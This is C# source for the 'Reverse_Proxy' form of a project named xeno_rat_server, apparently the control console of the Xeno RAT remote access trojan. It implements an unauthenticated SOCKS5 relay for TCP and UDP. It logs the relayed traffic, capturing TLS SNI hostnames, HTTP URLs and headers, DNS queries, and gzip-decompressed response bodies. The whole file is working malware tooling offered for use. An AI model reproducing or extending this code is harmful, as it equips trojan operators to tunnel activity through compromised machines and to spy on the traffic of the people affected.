using dnlib.DotNet.Emit;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Net.Mime.MediaTypeNames;

namespace xeno_rat_server.Forms
{
    public partial class Reverse_Proxy : Form
    {
        Node client;
        private Socket listenerSocket;
        private CancellationTokenSource _acceptCts;
        private Task _acceptLoopTask;
        private List<Node> activeSubnodes = new List<Node>();
        private X509Certificate2 serverCertificate;

        public Reverse_Proxy(Node _client, X509Certificate2 certificate = null)
        {
            InitializeComponent();
            client = _client;
            client.AddTempOnDisconnect(OnClientDisconnect);
            serverCertificate = certificate; // optional, required for TLS

            var listViewContextMenu = new ContextMenuStrip();
            var copyItem = new ToolStripMenuItem("Copy Selected");
            copyItem.Click += copySelectedItemsToolStripMenuItem_Click;
            listViewContextMenu.Items.Add(copyItem);

            listView1.ContextMenuStrip = listViewContextMenu;

            // Optional: show only on right-click on item
            listView1.MouseDown += ListView1_MouseDown;
        }

        private void OnClientDisconnect(Node node)
        {
            foreach (var n in activeSubnodes) n?.Disconnect();
            activeSubnodes.Clear();
            listenerSocket?.Close();
        }

        private async Task AcceptLoop(int port, CancellationToken token)
        {
            listenerSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            listenerSocket.Bind(new IPEndPoint(IPAddress.Any, port));
            listenerSocket.Listen(100);

            while (!token.IsCancellationRequested)
            {
                try
                {
                    var clientSock = await listenerSocket.AcceptAsync();
                    _ = Task.Run(() => HandleClientSock(clientSock, token));
                }
                catch (ObjectDisposedException)
                {
                    // Expected when stopping the listener
                    break;
                }
                catch (SocketException)
                {
                    // Likely listener closed
                    break;
                }
                catch (Exception ex)
                {
                    Console.WriteLine("AcceptLoop error: " + ex.Message);
                }
            }
        }


        private async Task HandleClientSock(Socket clientSock, CancellationToken token)
        {
            try
            {
                // Start SOCKS5 negotiation
                if (!await StartNegotiation(clientSock)) return;

                // Handle CONNECT command
                await HandleConnect(clientSock);
            }
            catch { clientSock.Close(); }
        }

        private async Task HandleConnect(Socket clientSock)
        {
            try
            {
                // Receive first 4 bytes: VER, CMD, RSV, ATYP
                byte[] header = await RecvAll(clientSock, 4);
                if (header == null || header.Length < 4)
                {
                    clientSock.Close();
                    return;
                }

                byte ver = header[0];
                byte cmd = header[1];
                byte rsv = header[2];
                byte addrType = header[3];

                if (ver != 5)
                {
                    await SendSocksReply(clientSock, 1); // General SOCKS failure
                    clientSock.Close();
                    return;
                }

                // --- Handle unsupported commands early ---
                if (cmd != 1 && cmd != 3) // 1=CONNECT, 3=UDP ASSOCIATE
                {
                    await SendSocksReply(clientSock, 7); // Command not supported
                    clientSock.Close();
                    return;
                }

                string destAddr = "";
                if (addrType == 1) // IPv4
                {
                    byte[] ipBytes = await RecvAll(clientSock, 4);
                    if (ipBytes == null) { clientSock.Close(); return; }
                    destAddr = string.Join(".", ipBytes);
                }
                else if (addrType == 3) // Domain name
                {
                    byte[] lenBuf = await RecvAll(clientSock, 1);
                    if (lenBuf == null) { clientSock.Close(); return; }
                    int len = lenBuf[0];

                    byte[] domainBytes = await RecvAll(clientSock, len);
                    if (domainBytes == null) { clientSock.Close(); return; }
                    destAddr = Encoding.ASCII.GetString(domainBytes);
                }
                else if (addrType == 4) // IPv6
                {
                    byte[] ipBytes = await RecvAll(clientSock, 16);
                    if (ipBytes == null) { clientSock.Close(); return; }
                    destAddr = new IPAddress(ipBytes).ToString();
                }
                else
                {
                    await SendSocksReply(clientSock, 8); // Address type not supported
                    clientSock.Close();
                    return;
                }

                // Read destination port (2 bytes)
                byte[] portBytes = await RecvAll(clientSock, 2);
                if (portBytes == null) { clientSock.Close(); return; }
                int destPort = (portBytes[0] << 8) | portBytes[1];

                ListViewItem lvi = null;

                // --- Handle UDP relay (CMD = 3) ---
                if (cmd == 3)
                {
                    UdpClient udpRelay = new UdpClient(0);
                    IPEndPoint localEp = (IPEndPoint)udpRelay.Client.LocalEndPoint;
                    await SendSocksReply(clientSock, 0, localEp.Address, (ushort)localEp.Port);

                    lvi = new ListViewItem($"UDP Relay {localEp.Address}:{localEp.Port}");
                    listView1?.BeginInvoke((MethodInvoker)(() => listView1.Items.Add(lvi)));

                    _ = Task.Run(() => HandleUdpRelay(udpRelay));
                    return;
                }
                else if (cmd == 1)
                {
                    // TCP relay            
                    // Connect to the remote destination
                    TcpClient remoteClient = new TcpClient();
                    try
                    {
                        await remoteClient.ConnectAsync(destAddr, destPort);
                    }
                    catch
                    {
                        await SendSocksReply(clientSock, 5);
                        clientSock.Close();
                        return;
                    }

                    await SendSocksReply(clientSock, 0);

                    lvi = new ListViewItem($"{destAddr}:{destPort}");
                    listView1?.BeginInvoke((MethodInvoker)(() => {
                        listView1.Items.Add(lvi);
                        //listView1.AutoResizeColumn(0, ColumnHeaderAutoResizeStyle.ColumnContent);
                        /*if (listView1.Items.Count > 0)
                        {
                            listView1.EnsureVisible(listView1.Items.Count - 1);
                        }*/
                    }));

                    _ = Task.Run(() => RelayLoop(clientSock, remoteClient, lvi));
                }
            }
            catch
            {
                clientSock.Close();
            }
        }

        private async Task HandleUdpRelay(UdpClient udpRelay)
        {
            var clientBuffers = new Dictionary<IPEndPoint, List<(byte frag, byte[] payload)>>(); // reassembly per client
            var udpClientPool = new Dictionary<string, UdpClient>(); // key: "ip:port"

            void PostUi(string text)
            {
                try
                {
                    string show = text.Length > 1200 ? text.Substring(0, 1200) + "…(truncated)" : text;
                    listView1?.BeginInvoke((MethodInvoker)(() =>
                    {
                        listView1.Items.Add($"[{DateTime.Now:HH:mm:ss}] {show}");
                        listView1.AutoResizeColumn(0, ColumnHeaderAutoResizeStyle.ColumnContent);
                        if (listView1.Items.Count > 0) listView1.EnsureVisible(listView1.Items.Count - 1);
                    }));
                }
                catch { }
            }

            string Trunc(string s, int max) => s?.Length > max ? s.Substring(0, max) + "…(truncated)" : s;
            bool LooksLikeText(byte[] data)
            {
                if (data == null || data.Length == 0) return false;
                int printable = 0;
                int toCheck = Math.Min(data.Length, 200);
                for (int i = 0; i < toCheck; i++)
                {
                    byte b = data[i];
                    if (b >= 0x20 && b <= 0x7E) printable++;
                    else if (b == 0x09 || b == 0x0A || b == 0x0D) printable++;
                }
                return ((double)printable) / toCheck > 0.90;
            }
            string HexPreview(byte[] data, int maxBytes = 64)
            {
                int n = Math.Min(data.Length, maxBytes);
                var hex = BitConverter.ToString(data, 0, n).Replace("-", " ");
                if (data.Length > n) hex += " …";
                return hex.ToLowerInvariant();
            }

            string TryParseDnsQueryName(byte[] payload)
            {
                try
                {
                    if (payload == null || payload.Length < 12) return null;
                    int qdcount = (payload[4] << 8) | payload[5];
                    if (qdcount == 0) return null;
                    int pos = 12;
                    var labels = new List<string>();
                    while (pos < payload.Length)
                    {
                        int len = payload[pos++];
                        if (len == 0) break;
                        if (len + pos > payload.Length) return null;
                        string label = Encoding.ASCII.GetString(payload, pos, len);
                        labels.Add(label);
                        pos += len;
                    }
                    return labels.Count > 0 ? string.Join(".", labels) : null;
                }
                catch { return null; }
            }

            try
            {
                PostUi("UDP relay enhanced started...");

                while (true)
                {
                    var result = await udpRelay.ReceiveAsync();
                    var data = result.Buffer;
                    var clientEp = result.RemoteEndPoint;

                    if (data == null || data.Length < 10) { PostUi($"UDP packet too small: {data?.Length ?? 0} bytes"); continue; }

                    int offset = 0;
                    ushort rsv = (ushort)((data[offset] << 8) | data[offset + 1]); offset += 2;
                    byte frag = data[offset++];
                    byte atyp = data[offset++];

                    string destAddr = "";
                    int destPort = 0;

                    if (atyp == 0x01)
                    {
                        if (offset + 4 > data.Length) continue;
                        destAddr = new System.Net.IPAddress(new byte[] { data[offset], data[offset + 1], data[offset + 2], data[offset + 3] }).ToString();
                        offset += 4;
                    }
                    else if (atyp == 0x03)
                    {
                        int len = data[offset++];
                        if (offset + len > data.Length) continue;
                        destAddr = Encoding.ASCII.GetString(data, offset, len);
                        offset += len;
                    }
                    else if (atyp == 0x04)
                    {
                        if (offset + 16 > data.Length) continue;
                        destAddr = new System.Net.IPAddress(data.Skip(offset).Take(16).ToArray()).ToString();
                        offset += 16;
                    }
                    else { PostUi($"Unsupported ATYP {atyp}"); continue; }

                    if (offset + 2 > data.Length) continue;
                    destPort = (data[offset] << 8) | data[offset + 1]; offset += 2;
                    byte[] payload = data.Skip(offset).ToArray();

                    // --- Reassembly for frag != 0
                    if (frag != 0)
                    {
                        if (!clientBuffers.ContainsKey(clientEp)) clientBuffers[clientEp] = new List<(byte, byte[])>();
                        clientBuffers[clientEp].Add((frag, payload));
                        PostUi($"Fragmented UDP packet stored (FRAG={frag}) for {clientEp}->{destAddr}:{destPort}");
                        continue; // wait for FRAG=0 packet
                    }
                    else if (clientBuffers.ContainsKey(clientEp) && clientBuffers[clientEp].Count > 0)
                    {
                        // assemble fragments
                        var fragments = clientBuffers[clientEp];
                        var totalLen = fragments.Sum(f => f.Item2.Length) + payload.Length;
                        byte[] fullPayload = new byte[totalLen];
                        int p = 0;
                        foreach (var f in fragments) { Array.Copy(f.Item2, 0, fullPayload, p, f.Item2.Length); p += f.Item2.Length; }
                        Array.Copy(payload, 0, fullPayload, p, payload.Length);
                        payload = fullPayload;
                        clientBuffers[clientEp].Clear();
                        clientBuffers.Remove(clientEp);
                        PostUi($"Reassembled UDP payload length={payload.Length} for {clientEp}->{destAddr}:{destPort}");
                    }

                    // --- QUIC Initial TLS ClientHello SNI inspection (best-effort)
                    if (payload.Length > 5 && payload[0] >= 0xC0) // long header
                    {
                        try
                        {
                            // parse TLS inside QUIC Initial (simplified)
                            var sni = TryParseSni(payload);
                            if (!string.IsNullOrEmpty(sni))
                                PostUi($"QUIC Initial packet: SNI={sni} from {clientEp}");
                        }
                        catch { }
                    }

                    // --- Logging payload
                    PostUi($"UDP -> {destAddr}:{destPort}, {payload.Length} bytes");
                    if (payload.Length == 0) { PostUi("Payload empty"); }
                    else if (LooksLikeText(payload))
                    {
                        string txt = null;
                        try { txt = Encoding.UTF8.GetString(payload); } catch { try { txt = Encoding.ASCII.GetString(payload); } catch { } }
                        PostUi($"Payload (text preview): {Trunc(txt, 400)}");
                    }
                    else
                    {
                        PostUi($"Payload preview (hex): {HexPreview(payload, 80)}");
                    }

                    // --- DNS inspection
                    if (destPort == 53)
                    {
                        string qname = TryParseDnsQueryName(payload);
                        if (!string.IsNullOrEmpty(qname))
                            PostUi($"DNS query for: {qname}");
                    }

                    // --- UDP forward (reuse UdpClient)
                    string poolKey = $"{destAddr}:{destPort}";
                    if (!udpClientPool.TryGetValue(poolKey, out var remoteUdp))
                    {
                        remoteUdp = new UdpClient();
                        udpClientPool[poolKey] = remoteUdp;
                    }

                    try
                    {
                        await remoteUdp.SendAsync(payload, payload.Length, destAddr, destPort);

                        // optionally await response (timeout)
                        var recvTask = remoteUdp.ReceiveAsync();
                        var completed = await Task.WhenAny(recvTask, Task.Delay(5000));
                        if (completed == recvTask)
                        {
                            var resp = recvTask.Result;
                            byte[] remotePayload = resp.Buffer;

                            // Build SOCKS5 UDP response header back to client
                            byte respAtyp = (byte)(resp.RemoteEndPoint.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork ? 0x01 : 0x04);
                            byte[] addrBytes = resp.RemoteEndPoint.Address.GetAddressBytes();
                            byte[] portBytes = new byte[] { (byte)(resp.RemoteEndPoint.Port >> 8), (byte)(resp.RemoteEndPoint.Port & 0xFF) };
                            byte[] respPacket = new byte[3 + 1 + addrBytes.Length + 2 + remotePayload.Length];
                            int ro = 0; respPacket[ro++] = 0x00; respPacket[ro++] = 0x00; respPacket[ro++] = 0x00; respPacket[ro++] = respAtyp;
                            Array.Copy(addrBytes, 0, respPacket, ro, addrBytes.Length); ro += addrBytes.Length;
                            respPacket[ro++] = portBytes[0]; respPacket[ro++] = portBytes[1];
                            Array.Copy(remotePayload, 0, respPacket, ro, remotePayload.Length);

                            await udpRelay.SendAsync(respPacket, respPacket.Length, clientEp);

                            int rlen = remotePayload.Length;
                            if (rlen == 0) PostUi($"Response from {resp.RemoteEndPoint}: empty");
                            else if (LooksLikeText(remotePayload))
                            {
                                string textResp = null;
                                try { textResp = Encoding.UTF8.GetString(remotePayload); } catch { try { textResp = Encoding.ASCII.GetString(remotePayload); } catch { } }
                                PostUi($"Response from {resp.RemoteEndPoint} (text preview): {Trunc(textResp, 400)}");
                            }
                            else
                            {
                                PostUi($"Response from {resp.RemoteEndPoint} (hex preview): {HexPreview(remotePayload, 80)}");
                            }
                        }
                        else PostUi($"No response from {destAddr}:{destPort} (timeout)");
                    }
                    catch (Exception ex) { PostUi($"UDP forward error: {ex.Message}"); }
                }
            }
            catch (Exception ex) { PostUi("UDP relay error: " + ex.Message); }
        }

        private byte[] BuildUdpResponse(byte[] payload, IPEndPoint remote)
        {
            byte[] addrBytes = remote.Address.GetAddressBytes();
            byte[] portBytes = { (byte)(remote.Port >> 8), (byte)(remote.Port & 0xFF) };

            byte atyp = addrBytes.Length == 4 ? (byte)0x01 : (byte)0x04;

            byte[] header = new byte[3 + 1 + addrBytes.Length + 2];
            int offset = 0;

            header[offset++] = 0x00; // RSV
            header[offset++] = 0x00; // RSV
            header[offset++] = 0x00; // FRAG
            header[offset++] = atyp;

            Array.Copy(addrBytes, 0, header, offset, addrBytes.Length);
            offset += addrBytes.Length;

            Array.Copy(portBytes, 0, header, offset, 2);
            offset += 2;

            return header.Concat(payload).ToArray();
        }


        private async Task<bool> StartNegotiation(Socket clientSock)
        {
            byte[] version = await RecvAll(clientSock, 1);
            if (version == null || version[0] != 5) return false;

            byte[] nMethods = await RecvAll(clientSock, 1);
            if (nMethods == null) return false;

            byte[] methods = await RecvAll(clientSock, nMethods[0]);
            if (methods == null) return false;

            // Only no-auth
            await clientSock.SendAsync(new ArraySegment<byte>(new byte[] { 5, 0 }), SocketFlags.None);
            return true;
        }

        private async Task RelayLoop(Socket clientSock, TcpClient remoteClient, ListViewItem lvi)
        {
            var clientStream = new NetworkStream(clientSock, ownsSocket: true);
            var remoteStream = remoteClient.GetStream();

            // Inspection buffers and flags (per-connection)
            var clientToRemoteInspect = new MemoryStream();
            var remoteToClientInspect = new MemoryStream();
            bool sniFound = false;
            bool httpRequestShown = false;
            bool previewShownRemote = false;
            const int MAX_INSPECT = 1024 * 1024; // 1MB       
            const int PREVIEW_TRIGGER_BYTES = 512;   // show preview once we have this many bytes (or you can t
            const int PREVIEW_MAX = 256;
            const int UI_TRUNCATE_LOCAL = 1024;

            Action<string> PostUi = (text) =>
            {
                try
                {
                    string show = text.Length > UI_TRUNCATE_LOCAL ? text.Substring(0, UI_TRUNCATE_LOCAL) + "…(truncated)" : text;
                    listView1?.BeginInvoke((MethodInvoker)(() =>
                    {
                        listView1.Items.Add($"[{DateTime.Now:HH:mm:ss}] {show}");
                        //listView1.AutoResizeColumn(0, ColumnHeaderAutoResizeStyle.ColumnContent);
                        //if (listView1.Items.Count > 0) listView1.EnsureVisible(listView1.Items.Count - 1);
                    }));
                }
                catch { }
            };

            // Helper to append to inspect buffer in a bounded way
            void AppendInspect(MemoryStream ms, byte[] buf, int offset, int count)
            {
                if (ms.Length + count <= MAX_INSPECT)
                {
                    ms.Write(buf, offset, count);
                }
                else
                {
                    // simple strategy: clear if too big to keep memory bounded
                    ms.SetLength(0);
                }
            }

            // Copy from source -> destination while also sending a copy to "inspect" MemoryStream via callback.
            async Task CopyAndInspectAsync(Stream src, Stream dst, MemoryStream inspectBuffer, Action<byte[], int, int> inspector, CancellationToken ct)
            {
                var buf = new byte[16 * 1024];
                try
                {
                    while (!ct.IsCancellationRequested)
                    {
                        int r = await src.ReadAsync(buf, 0, buf.Length, ct);
                        if (r == 0) break; // EOF
                                           // Forward immediately (do NOT wait for inspection)
                        await dst.WriteAsync(buf, 0, r, ct);
                        await dst.FlushAsync(ct);

                        // Async inspect (do not await heavy work here — just append small copy)
                        try
                        {
                            // copy the bytes to the inspector (inspector should be lightweight)
                            inspector(buf, 0, r);
                        }
                        catch { /* non-fatal inspection error */ }
                    }
                }
                catch { /* ignore read/write errors; pipeline will be torn down */ }
            }

            var cts = new CancellationTokenSource();

            try
            {
                // Define inspector callbacks
                void ClientToRemoteInspector(byte[] buf, int off, int len)
                {
                    AppendInspect(clientToRemoteInspect, buf, off, len);

                    // Try parse ClientHello SNI (only once)
                    if (!sniFound && clientToRemoteInspect.Length >= 5)
                    {
                        try
                        {
                            var arr = clientToRemoteInspect.ToArray();
                            var sni = TryParseSni(arr);
                            if (!string.IsNullOrEmpty(sni))
                            {
                                sniFound = true;
                                // Update UI
                                listView1?.BeginInvoke((MethodInvoker)(() =>
                                {
                                    if (lvi != null) lvi.Text = $"{lvi.Text} (SNI:{sni})";
                                }));
                                PostUi($"SNI: {sni}");
                            }
                        }
                        catch { /* ignore */ }
                    }

                    // Try parse HTTP request line + Host (only once)
                    if (!httpRequestShown)
                    {
                        try
                        {
                            var arr = clientToRemoteInspect.ToArray();
                            string maybeText = null;
                            try { maybeText = Encoding.ASCII.GetString(arr); } catch { maybeText = null; }
                            if (!string.IsNullOrEmpty(maybeText))
                            {
                                int he = maybeText.IndexOf("\r\n\r\n", StringComparison.Ordinal);
                                if (he >= 0)
                                {
                                    string headers = maybeText.Substring(0, he);
                                    var lines = headers.Split(new[] { "\r\n" }, StringSplitOptions.None);
                                    if (lines.Length > 0)
                                    {
                                        string reqLine = lines[0];
                                        var parts = reqLine.Split(' ');
                                        if (parts.Length >= 2)
                                        {
                                            string method = parts[0];
                                            string target = parts[1];
                                            string host = null;
                                            foreach (var l in lines.Skip(1))
                                            {
                                                int c = l.IndexOf(':');
                                                if (c > 0)
                                                {
                                                    string name = l.Substring(0, c).Trim();
                                                    if (string.Equals(name, "Host", StringComparison.OrdinalIgnoreCase))
                                                    {
                                                        host = l.Substring(c + 1).Trim();
                                                        break;
                                                    }
                                                }
                                            }

                                            if (!string.IsNullOrEmpty(host))
                                            {
                                                string url = (target.StartsWith("http://", StringComparison.OrdinalIgnoreCase) || target.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
                                                    ? target
                                                    : $"http://{host}{target}";
                                                httpRequestShown = true;
                                                PostUi($"HTTP request: {method} {url}");
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        catch { /* ignore */ }
                    }
                }

                // Remote->Client inspector: typically we look for response headers / gzip etc.
                void RemoteToClientInspector(byte[] buf, int off, int len)
                {
                    AppendInspect(remoteToClientInspect, buf, off, len);

                    try
                    {
                        var arr = remoteToClientInspect.ToArray();
                        string maybeText = null;
                        try { maybeText = Encoding.ASCII.GetString(arr); } catch { maybeText = null; }

                        if (!string.IsNullOrEmpty(maybeText))
                        {
                            // Try to find headers first
                            int headerEnd = maybeText?.IndexOf("\r\n\r\n", StringComparison.Ordinal) ?? -1;
                            if (headerEnd >= 0)
                            {
                                string headers = maybeText.Substring(0, headerEnd);
                                PostUi($"HTTP headers detected: {Trunc(headers, 400)}");

                                // Check for gzip
                                bool isGzip = headers.IndexOf("Content-Encoding: gzip", StringComparison.OrdinalIgnoreCase) >= 0;

                                // Try parse Content-Length to know how many body bytes to wait for
                                int contentLength = 0;
                                foreach (var line in headers.Split(new[] { "\r\n" }, StringSplitOptions.None))
                                {
                                    if (line.StartsWith("Content-Length:", StringComparison.OrdinalIgnoreCase))
                                    {
                                        int.TryParse(line.Substring(15).Trim(), out contentLength);
                                        break;
                                    }
                                }

                                byte[] bodyBytes = arr.Skip(headerEnd + 4).ToArray();

                                // Only process if we have the full body
                                if (contentLength == 0 || bodyBytes.Length >= contentLength)
                                {
                                    if (isGzip)
                                    {
                                        try
                                        {
                                            using (var ms = new MemoryStream(bodyBytes))
                                            using (var gz = new System.IO.Compression.GZipStream(ms, System.IO.Compression.CompressionMode.Decompress))
                                            using (var dec = new MemoryStream())
                                            {
                                                gz.CopyTo(dec);
                                                string html = Encoding.UTF8.GetString(dec.ToArray());
                                                PostUi($"Decompressed body: {Trunc(html, 1000)}");
                                            }
                                        }
                                        catch (Exception ex)
                                        {
                                            PostUi($"Gzip decompress failed: {ex.Message}");
                                        }
                                    }
                                    else
                                    {
                                        string bodyText = null;
                                        try { bodyText = Encoding.UTF8.GetString(bodyBytes); } catch { bodyText = null; }
                                        if (!string.IsNullOrEmpty(bodyText))
                                            PostUi($"Body: {Trunc(bodyText, 1000)}");
                                        else
                                            PostUi($"Body: {bodyBytes.Length} bytes (binary)");
                                    }
                                }

                                // Display body even if no gzip
                                if (bodyBytes.Length > 0)
                                {
                                    if (LooksLikeText(bodyBytes))
                                    {
                                        string bodyText = null;
                                        try { bodyText = Encoding.UTF8.GetString(bodyBytes); } catch { try { bodyText = Encoding.ASCII.GetString(bodyBytes); } catch { bodyText = null; } }
                                        if (!string.IsNullOrEmpty(bodyText))
                                            PostUi($"Body (truncated): {Trunc(bodyText, 1000)}");
                                        else
                                            PostUi($"Body: {bodyBytes.Length} bytes (text detected but decode failed)");
                                    }
                                    else
                                    {
                                        PostUi($"Body: {bodyBytes.Length} bytes (binary)");
                                    }
                                }

                                // Reset buffer so we can parse next response separately
                                remoteToClientInspect = new MemoryStream();
                            }
                            else
                            {
                                // If headers not complete, but enough data, show preview
                                if (arr.Length > 64 && !previewShownRemote)
                                {
                                    previewShownRemote = true;
                                    if (LooksLikeText(arr))
                                    {
                                        string preview = null;
                                        try { preview = Encoding.UTF8.GetString(arr, 0, Math.Min(arr.Length, 200)); } catch { try { preview = Encoding.ASCII.GetString(arr, 0, Math.Min(arr.Length, 200)); } catch { } }
                                        if (!string.IsNullOrEmpty(preview)) PostUi($"Remote payload preview: {Trunc(preview, 200)}");
                                    }
                                    else
                                    {
                                        string hex = BitConverter.ToString(arr, 0, Math.Min(arr.Length, 64)).Replace("-", " ");
                                        PostUi($"Remote payload preview (hex): {Trunc(hex, 100)}");
                                    }
                                }
                            }
                        }
                    }
                    catch { }
                }

                // Start two piping tasks
                var t1 = CopyAndInspectAsync(clientStream, remoteStream, clientToRemoteInspect, ClientToRemoteInspector, cts.Token); // client -> remote
                var t2 = CopyAndInspectAsync(remoteStream, clientStream, remoteToClientInspect, RemoteToClientInspector, cts.Token); // remote -> client

                // Wait for either side to finish
                await Task.WhenAny(t1, t2);
                cts.Cancel();
                // wait briefly for graceful shutdown
                await Task.WhenAll(Task.WhenAll(t1.ContinueWith(_ => { }), t2.ContinueWith(_ => { })), Task.Delay(50));
            }
            finally
            {
                try { clientStream.Close(); } catch { }
                try { remoteStream.Close(); } catch { }
                try { remoteClient.Close(); } catch { }
                try { clientSock.Close(); } catch { }

                // Remove UI item
                if (lvi != null)
                    listView1?.BeginInvoke((MethodInvoker)(() => lvi.Remove()));
            }
        }

        private static string TryParseSni(byte[] data)
        {
            // Minimal, defensive SNI parser.
            // Returns hostname string or null. Does NOT validate TLS versions or lengths exhaustively.
            try
            {
                int pos = 0;
                if (data.Length < 5) return null;

                // TLS record header
                byte recordType = data[pos++]; // 22 = handshake
                if (recordType != 0x16) return null;
                // version
                pos += 2;
                // length
                if (pos + 2 > data.Length) return null;
                int recLen = (data[pos] << 8) | data[pos + 1];
                pos += 2;
                if (pos + recLen > data.Length) return null;

                // Handshake header
                if (pos + 4 > data.Length) return null;
                byte hsType = data[pos++]; // 1 = ClientHello
                if (hsType != 0x01) return null;
                int hsLen = (data[pos] << 16) | (data[pos + 1] << 8) | data[pos + 2];
                pos += 3;
                if (pos + hsLen > data.Length) return null;

                // Skip: client_version(2) + random(32)
                pos += 2 + 32;
                if (pos >= data.Length) return null;

                // Session ID
                if (pos + 1 > data.Length) return null;
                int sessionIdLen = data[pos++];
                pos += sessionIdLen;
                if (pos + 2 > data.Length) return null;

                // Cipher Suites
                int csLen = (data[pos] << 8) | data[pos + 1];
                pos += 2 + csLen;

                if (pos + 1 > data.Length) return null;
                // Compression methods
                int compLen = data[pos++];
                pos += compLen;

                // Extensions length
                if (pos + 2 > data.Length) return null;
                int extLen = (data[pos] << 8) | data[pos + 1];
                pos += 2;
                int extEnd = pos + extLen;
                if (extEnd > data.Length) return null;

                while (pos + 4 <= extEnd)
                {
                    int extType = (data[pos] << 8) | data[pos + 1];
                    int extLength = (data[pos + 2] << 8) | data[pos + 3];
                    pos += 4;
                    if (pos + extLength > extEnd) break;

                    if (extType == 0x00) // server_name
                    {
                        int sPos = pos;
                        if (sPos + 2 > pos + extLength) break;
                        int listLen = (data[sPos] << 8) | data[sPos + 1];
                        sPos += 2;
                        int listEnd = sPos + listLen;
                        while (sPos + 3 <= listEnd)
                        {
                            byte nameType = data[sPos++];
                            int nameLen = (data[sPos] << 8) | data[sPos + 1];
                            sPos += 2;
                            if (sPos + nameLen > listEnd) break;
                            if (nameType == 0)
                            {
                                string host = Encoding.ASCII.GetString(data, sPos, nameLen);
                                return host;
                            }
                            sPos += nameLen;
                        }
                        break;
                    }
                    pos += extLength;
                }
            }
            catch { /* ignore parse errors */ }
            return null;
        }

        private static string Trunc(string s, int max)
        {
            if (string.IsNullOrEmpty(s)) return s;
            return s.Length <= max ? s : s.Substring(0, max) + "…";
        }

        private static bool LooksLikeText(byte[] data)
        {
            // rough heuristic: if >90% printable ASCII or UTF-8 characters, treat as text
            int printable = 0;
            foreach (var b in data)
            {
                if (b == 9 || b == 10 || b == 13) { printable++; continue; }
                if (b >= 32 && b <= 126) printable++;
            }
            return data.Length == 0 ? false : (printable / (double)data.Length) > 0.9;
        }

        private async Task SendSocksReply(Socket sock, byte replyCode, IPAddress bindAddr = null, ushort bindPort = 0)
        {
            if (bindAddr == null) bindAddr = IPAddress.Any;
            byte[] addrBytes = bindAddr.GetAddressBytes();
            byte[] portBytes = new byte[2] { (byte)(bindPort >> 8), (byte)(bindPort & 0xFF) };
            byte[] reply = new byte[10] { 5, replyCode, 0, 1, addrBytes[0], addrBytes[1], addrBytes[2], addrBytes[3], portBytes[0], portBytes[1] };
            await sock.SendAsync(new ArraySegment<byte>(reply), SocketFlags.None);
        }

        private async Task<byte[]> RecvAll(Socket sock, int size)
        {
            byte[] data = new byte[size];
            int received = 0;
            while (received < size)
            {
                int r = await sock.ReceiveAsync(new ArraySegment<byte>(data, received, size - received), SocketFlags.None);
                if (r == 0) return null;
                received += r;
            }
            return data;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            int port = int.Parse(textBox1.Text);
            _acceptCts = new CancellationTokenSource();
            _acceptLoopTask = AcceptLoop(port, _acceptCts.Token);
            button1.Enabled = false;
            button2.Enabled = true;
        }

        private async void button2_Click(object sender, EventArgs e)
        {
            _acceptCts?.Cancel();
            listenerSocket?.Close();
            if (_acceptLoopTask != null) await Task.WhenAny(_acceptLoopTask, Task.Delay(500));
            button1.Enabled = true;
            button2.Enabled = false;
        }

        private void Reverse_Proxy_FormClosing(object sender, FormClosingEventArgs e)
        {
            _acceptCts?.Cancel();
            listenerSocket?.Close();
        }

        private void textBox2_TextChanged(object sender, EventArgs e) { }

        private void Reverse_Proxy_Load(object sender, EventArgs e)
        {
            listView1.GetType().GetProperty("DoubleBuffered", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic).SetValue(listView1, true, null);
        }

        private void copySelectedItemsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 0) return;

            // Gather text first (safe to do on any thread)
            var sb = new StringBuilder();
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                var line = string.Join("\t", item.SubItems.Cast<ListViewItem.ListViewSubItem>().Select(s => s.Text));
                sb.AppendLine(line);
            }
            string textToCopy = sb.ToString();

            // Clipboard.SetText must run on STA thread
            Thread staThread = new Thread(() =>
            {
                try
                {
                    Clipboard.SetText(textToCopy);
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Clipboard copy failed: {ex.Message}");
                }
            });
            staThread.SetApartmentState(ApartmentState.STA);
            staThread.Start();
            staThread.Join(); // optional: wait until done
        }


        private void ListView1_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                var hit = listView1.HitTest(e.Location);
                if (hit.Item != null)
                {
                    // If the clicked item is already selected, do nothing
                    if (!hit.Item.Selected)
                    {
                        // Otherwise, select only this item (single selection)
                        listView1.SelectedItems.Clear();
                        hit.Item.Selected = true;
                    }
                }
                else
                {
                    // Clicked empty space → clear selection
                    listView1.SelectedItems.Clear();
                }
            }
        }
    }
}